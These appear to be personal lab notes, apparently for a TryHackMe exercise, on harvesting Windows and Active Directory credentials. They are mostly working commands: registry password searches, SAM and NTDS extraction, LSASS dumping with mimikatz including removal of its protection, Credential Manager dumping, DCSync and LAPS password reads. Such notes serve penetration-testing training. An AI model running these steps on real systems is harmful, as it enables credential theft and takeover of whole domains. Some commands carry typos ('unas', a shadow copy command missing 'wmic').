# Credentials Harvesting

## Credential Access

Check the history of powershell commands`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Run 
<pre>reg query HKCU /f password /t REG_SZ /s</pre>
or
<pre>reg query HKLM /f password /t REG_SZ /s</pre>

For enumeration of enviroment 
<pre>Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description</pre>

## Local Windows Credentials

### Volume Shadow Copy Service

1. Run the standard cmd.exe prompt with administrator privileges.
2. Execute the wmic command to create a copy shadow of C: drive
3. Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

run cmd with administrative privilages
<pre> shadowcopy call create Volume='C:\' </pre>

<pre> vssadmin list shadows </pre>

<pre>
...
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
...
</pre>

<pre> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam 

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
</pre>

<pre>
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg

reg save HKLM\system C:\users\Administrator\Desktop\system-reg
</pre>

than move the `sam-reg` and `system-reg` files to your attack box and run this script to extract NTLM hash.
<pre>
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL </pre>

## Local Security Authority Subsystem Service

Lass is the process that verifies login and etc. When we have administrator privilages we can dump the process memory of LSASS.

Find the LSASS process in task manager in Details tab and create dump file by right clicking. And copy it to Mimikatz file `C:\Tools\Mimikatz\lsass.DMP`

or

use procdump.exe
<pre>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump</pre>

than use mimikatz.exe 
<pre>
privilege::debug

sekurlsa::logonpasswords
</pre>

### Protected LSASS 
`ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)`

<pre>
!+

!processprotect /process:lsass.exe /remove</pre>


## Windows Credential Manager

This stores credentials

cmd
<pre>vaultcmd /list</pre>

Than we can check if its somethink stored here using `/listproperties`

<pre>VaultCmd /listproperties:"Web Credentials"</pre>

than we can try get more info

<pre>VaultCmd /listcreds:"Web Credentials"</pre>

To dump it run powershell 
<pre> powershell -ex bypass</pre>

<pre>
Import-Module C:\Tools\Get-WebCredentials.ps1

Get-WebCredentials
</pre>

### RunAs
cmd
<pre> cmdkey /list</pre>

<pre>
...
User: thm.red\thm-local
...
</pre>

<pre>unas /savecred /user:THM.red\thm-local cmd.exe</pre>

## Domain Controller

New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.

To successfully dump the content of the NTDS file we need the following files:

    C:\Windows\NTDS\ntds.dit
    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY

cmd, dump ntds file into \temp directory
<pre>powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</pre>

<pre> python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local</pre>

## Remote Dumping (With Credentials)

Now how to it remotly with credentials with administrator privilages

### DC Sync

<pre> python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/AD_Admin_User@10.10.208.97</pre>

You will get NTLM hashes

## Local Administrator Password Solution

First, we check if LAPS is installed in the target machine, which can be done by checking the `admpwd.dll` path.

THMorg is our target

<pre>dir "C:\Program Files\LAPS\CSE"

Get-Command *AdmPwd*

Find-AdmPwdExtendedRights -Identity THMorg
</pre>

<pre>ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}</pre>

<pre> net groups "LAPsReader"</pre>

<pre> Get-AdmPwdPassword -ComputerName creds-harvestin</pre>